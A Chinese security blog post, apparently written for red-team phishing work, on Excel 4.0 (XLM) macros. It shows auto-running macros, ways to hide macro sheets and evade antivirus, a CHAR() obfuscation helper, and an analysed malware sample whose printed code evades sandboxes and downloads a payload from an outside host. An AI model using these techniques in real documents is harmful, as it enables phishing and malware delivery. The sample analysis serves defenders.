<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Office Excel Macro | ascotbe</title><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！   前言  好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。  关于宏 据我所知微软office所支持的宏里面，目前有两种  1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。">
<meta property="og:type" content="article">
<meta property="og:title" content="Office Excel Macro">
<meta property="og:url" content="https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/index.html">
<meta property="og:site_name" content="ascotbe">
<meta property="og:description" content="郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！   前言  好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。  关于宏 据我所知微软office所支持的宏里面，目前有两种  1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/121.jpg">
<meta property="article:published_time" content="2021-01-27T10:45:42.000Z">
<meta property="article:modified_time" content="2023-01-05T06:17:01.632Z">
<meta property="article:author" content="ascotbe">
<meta property="article:tag" content="免杀">
<meta property="article:tag" content="红蓝对抗">
<meta property="article:tag" content="邮件钓鱼">
<meta property="article:tag" content="Excel宏">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/121.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本篇文章距最近一次更新已过去","messageNext":"天，文章内容有可能过时."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: ascotbe","link":"链接: ","source":"来源: ascotbe","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Office Excel Macro',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-05 14:17:01'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3133731_25dh7dx5bg4.css"><link rel="stylesheet" href="/css/beating_icon.css"><link rel="stylesheet" href="/css/mouse.css"><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="ascotbe" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">91</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/121.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ascotbe</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-dongwu"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 内容</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-danger-full"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-zhiwu"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-tubiaozhizuomoban-"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw iconfont icon-godot-assets1"></i><span> 漏洞</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery"><i class="fa-fw iconfont icon-forms_dota_dragon_big"></i><span> 图片</span></a></div><div class="menus_item"><a class="site-page" href="/Link/"><i class="fa-fw iconfont icon-FaceID"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-maomi_touxiang"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Office Excel Macro</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Office Excel Macro"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
</div>
<blockquote>
<p>前言</p>
</blockquote>
<p>好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/1.png" alt="image-20210128134158060"></p>
<h3 id="关于宏">关于宏</h3>
<p>据我所知微软office所支持的宏里面，目前有两种</p>
<ul>
<li>1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。Excel4.0宏代码写在表格中，宏代码的具体文件呈现为xml而不是二进制文件。</li>
<li>1993年：微软更新了Excel5.0技术，也就是现在常见的VBA宏代码。</li>
</ul>
<p>从Excel2010到Excel2019全线产品都支持Excel4.0宏。同时微软也提到，虽然目前Microsoft Excel仍然支持Excel4.0宏，但还是建议用户使用VBA宏。</p>
<h3 id="macro-4-0">Macro 4.0</h3>
<h4 id="简单利用">简单利用</h4>
<p>在箭头位置点击右键-&gt;插入即可使用</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/2.png" alt="image-20210126164024520"></p>
<p>接着会出现一个新建的宏表格，我们在表格中添加如下命令，即可完成一个简单的宏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=EXEC(&quot;calc.exe&quot;)</span><br><span class="line">=ALERT(&quot;hello ascotbe~&quot;)</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/3.gif" alt="1"></p>
<h4 id="隐蔽性">隐蔽性</h4>
<p>可以见到使用XLM宏比常见的VBA宏具有更好的免杀性，主要原因XLM宏和VBA宏的设计理念不同，导致了宏代码在文件结构中的呈现不同，和VBA宏一样的是，在文件打开时，Excel依旧会提醒用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Because of your security settings, macros have been disabled. To run macros, you need to reopen this workbook, and then choose to enable macros. For more information about enabling macros, click Help.</span><br></pre></td></tr></table></figure>
<p>不同的是，当用户单击启用之后，ALT + F11打开宏代码窗口，却并不能看到宏代码。也不能通过一些常见的宏代码提取工具检测分析宏。</p>
<p>这是因为默认情况下，XLM宏代码存储在<code>ascotbe.xlsm\xl\Macrosheets\Sheet1.xml</code>。打开该xml文件，可以清晰的看到刚才在Excel工作表中插入的宏代码。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/4.png" alt="image-20210126173824786"></p>
<h4 id="自动加载">自动加载</h4>
<ul>
<li>Auto_Open：在用户打开文档的时候自动运行（如果用户允许执行宏代码）</li>
<li>Auto_Close：在用户关闭文档的时候自动运行（如果用户允许执行宏代码）</li>
</ul>
<p>XLM宏只需要将需要执行宏的单元格名称设置为Auto_Open或Auto_Close即可实现宏代码的自动加载。</p>
<h5 id="设置单元格名称">设置单元格名称</h5>
<p>点击一个单元格，然后选着公式-&gt;定义的名称-&gt;定义名称即可设置成功</p>
<h5 id="演示">演示</h5>
<p>没有设置Auto_Close关闭文档，可以看到无任何反应，当我们设置了以后关闭，弹出了计算器和弹窗</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/5.gif" alt="2"></p>
<h4 id="隐藏方式">隐藏方式</h4>
<h5 id="简单的隐藏">简单的隐藏</h5>
<p>左下角隐藏，可以通过右键-&gt;取消隐藏来显示</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/6.png" alt="image-20210127104310071"></p>
<p>列隐藏，可以看到正常都是从A1开始的表格，隐藏了列以后变成了从D1开始了，并且进度条是拉倒最左边的</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/7.png" alt="image-20210127104449564"></p>
<h5 id="进制隐藏">进制隐藏</h5>
<p>这种隐藏方式如果使用<code>xlsm</code>后缀格式的话是无法利用的，但是xls格式是可以的，通过全局搜索字符串<code>sheet1</code>找到后面十六进制是<strong>85 00</strong>开头的位置，然后往后数九个字节，可以看到框起来的最后一个字节是01</p>
<ul>
<li>00:表示不隐藏</li>
<li>01:表示浅隐藏（可通过鼠标右键取消隐藏）</li>
<li>02:表示深度隐藏（无法在Excel中找到）</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/8.png" alt="image-20210127181124488"></p>
<p>具体效果可以看图</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/9.gif" alt="3"></p>
<h4 id="一个案例">一个案例</h4>
<p>样本下载地址<a target="_blank" rel="noopener" href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">点我</a>，备份地址<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/Info_695.xls.zip">下载</a>，下面是样本的截图</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/10.png" alt="img"></p>
<h5 id="如何定位该样本的隐藏宏位置">如何定位该样本的隐藏宏位置</h5>
<p>下载项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/DidierStevens/DidierStevensSuite</span><br></pre></td></tr></table></figure>
<p>然后执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python oledump.py -p plugin_biff.py --pluginoptions &quot;-o BOUNDSHEET -a&quot; /Users/ascotbe/Downloads/Info_695.xls</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/12.png" alt="image-20210308143858216"></p>
<p>可以看到定位到了宏的位置<strong>D0 66 02 00 02 01 0A 00</strong>，只需要修改第5个字节位置的02即可打开深度隐藏宏</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/13.png" alt="image-20210308144106093"></p>
<h5 id="样本分析">样本分析</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=IF(GET.WORKSPACE(19),,CLOSE(TRUE))#检查是否存在鼠标，如果GET.WORKSPACE获取的值为false的话，就执行CLOSE保存关闭表格。if函数第二个参数是判断第一个参数返回值为ture执行位置，第三个参数是判断第一个参数返回值为false执行位置</span><br><span class="line">=IF(GET.WORKSPACE(42),,CLOSE(TRUE))#计算机是否能够播放声音</span><br><span class="line">=IF(ISNUMBER(SEARCH(&quot;Windows&quot;,GET.WORKSPACE(1))), ,CLOSE(TRUE))#检查运行Microsoft Excel的环境，然后检查环境的版本号</span><br></pre></td></tr></table></figure>
<p>如果这三个是正确的，则将Excel安全注册表项复制到<strong>C:\Users\public\1.reg</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=CALL(&quot;Shell32&quot;,&quot;ShellExecuteA&quot;,&quot;JJCCCJJ&quot;,0,&quot;open&quot;,&quot;C:\Windows\system32\reg.exe&quot;,&quot;EXPORT HKCU\Software\Microsoft\Office\&quot;&amp;GET.WORKSPACE(2)&amp;&quot;\Excel\Security c:\users\public\1.reg /y&quot;,0,5)</span><br></pre></td></tr></table></figure>
<p>接下来，它等待三秒钟。然后它打开1.reg，从字节位置215开始，并读取接下来的255个字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=WAIT(NOW()+&quot;00:00:03&quot;)</span><br><span class="line">=FOPEN(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">=FPOS(Q10, 215)</span><br><span class="line">=FREAD(Q10, 255)</span><br></pre></td></tr></table></figure>
<p>提取出来的<a target="_blank" rel="noopener" href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">1.reg</a>内容</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/11.png" alt="image-20210308180750093"></p>
<p>1.reg被关闭并删除。然后它在读取的内容（存储在单元格Q12中）中搜索字符串“ 0001”。这是第二次测试，看它是否在沙箱中。如果找到该字符串，它将关闭电子表格。如果找不到字符串“ 0001”，它将尝试下载文件并将其另存为.html文件在**C:\Users\Public\**中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=FCLOSE(Q10)</span><br><span class="line">=FILE.DELETE(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">=IF(ISNUMBER(SEARCH(&quot;0001&quot;,Q12)),CLOSE(FALSE),)</span><br><span class="line">=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCJJ&quot;,0,&quot;https://efbzfyvsb.website/f2f23&quot;,&quot;c:\Users\Public\b7gf5yk.html&quot;,0,0)</span><br></pre></td></tr></table></figure>
<p>完整的英文语法文档<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/Excel4.0MacroFunctionsReference.pdf">下载</a>，中文版<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ascotbe/Image/master/OfficeExcelMacro/MacrofunCn.hlp">下载</a>，一个在线的Excel xml宏函数<a target="_blank" rel="noopener" href="http://www.cpearson.com/excel/call.htm">文档</a>里面比官网文档全面</p>
<p>关于注册表reg文件的解释参考这篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fczjuever/archive/2013/04/09/3010711.html">博客</a></p>
<p>最后贴上代码转ASCII代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;&quot;&quot;xxx&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=CHAR(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="macro-5-0">Macro 5.0</h3>
<p>关于VBA宏的制作这里就不概述了，可以参考之前的<a href="https://www.ascotbe.com/2020/07/26/Office_0x01/#Office%E5%AE%8F">文章</a>，可以看到word和excel的vba宏是通用的</p>
<h3 id="参考文章">参考文章</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://clickallthethings.wordpress.com/2020/04/06/covid-19-excel-4-0-macros-and-sandbox-detection/</span><br><span class="line">https://www.yuque.com/p1ut0/qtmgyx/rqank4</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com">ascotbe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/">https://www.ascotbe.com/2021/01/27/OfficeExcelMacro/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ascotbe.com" target="_blank">ascotbe</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><a class="post-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a><a class="post-meta__tags" href="/tags/Excel%E5%AE%8F/">Excel宏</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/121.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/26/StackOverflow_Linux_0x03/"><img class="prev-cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/122.jpg" onerror="onerror=null;src='/img/404.gif'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Linux栈溢出总结（0x03）</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/08/CrossSiteScripting/"><img class="next-cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/120.jpg" onerror="onerror=null;src='/img/404.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从零开始编写XSS平台</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/08/17/Office_0x02/" title="关于邮件钓鱼的哪些事(二)"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/131.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-17</div><div class="title">关于邮件钓鱼的哪些事(二)</div></div></a></div><div><a href="/2020/07/26/Office_0x01/" title="关于邮件钓鱼的哪些事"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/111.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-26</div><div class="title">关于邮件钓鱼的哪些事</div></div></a></div><div><a href="/2020/05/21/BypassTheVirtualMachine/" title="木马绕过虚拟机"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/101.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-21</div><div class="title">木马绕过虚拟机</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">91</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，否则与作者无关，如果您不同意请关闭本站<img src= "/img/loading.gif" data-lazy-src="/img/announcement2.gif" style="zoom:25%;" ></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%AE%8F"><span class="toc-number">1.</span> <span class="toc-text">关于宏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#macro-4-0"><span class="toc-number">2.</span> <span class="toc-text">Macro 4.0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">简单利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%94%BD%E6%80%A7"><span class="toc-number">2.2.</span> <span class="toc-text">隐蔽性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text">自动加载</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E5%8D%95%E5%85%83%E6%A0%BC%E5%90%8D%E7%A7%B0"><span class="toc-number">2.3.1.</span> <span class="toc-text">设置单元格名称</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA"><span class="toc-number">2.3.2.</span> <span class="toc-text">演示</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F"><span class="toc-number">2.4.</span> <span class="toc-text">隐藏方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E9%9A%90%E8%97%8F"><span class="toc-number">2.4.1.</span> <span class="toc-text">简单的隐藏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E9%9A%90%E8%97%8F"><span class="toc-number">2.4.2.</span> <span class="toc-text">进制隐藏</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E6%A1%88%E4%BE%8B"><span class="toc-number">2.5.</span> <span class="toc-text">一个案例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 